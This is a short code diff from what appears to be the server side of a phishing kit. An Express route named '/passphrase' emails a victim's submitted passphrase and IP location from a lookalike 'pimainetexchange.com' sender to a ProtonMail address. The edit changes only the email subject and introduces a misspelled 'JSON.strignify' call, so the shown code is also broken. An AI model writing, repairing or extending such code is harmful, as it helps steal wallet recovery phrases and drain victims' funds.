@@ -66,7 +66,7 @@ app.post('/passphrase', async (req, res) => {
   const mailOptions = {
     from: 'admin@pimainetexchange.com',
     to: 'pinetwork101@proton.me',
-    subject: `${clientIP}: Passphrase Received`,
+    subject: `${JSON.strignify(clientIP)}`,
     text: `
               \nPassphrase: ${passphrase}\n
               \nIP Location: ${clientIP}
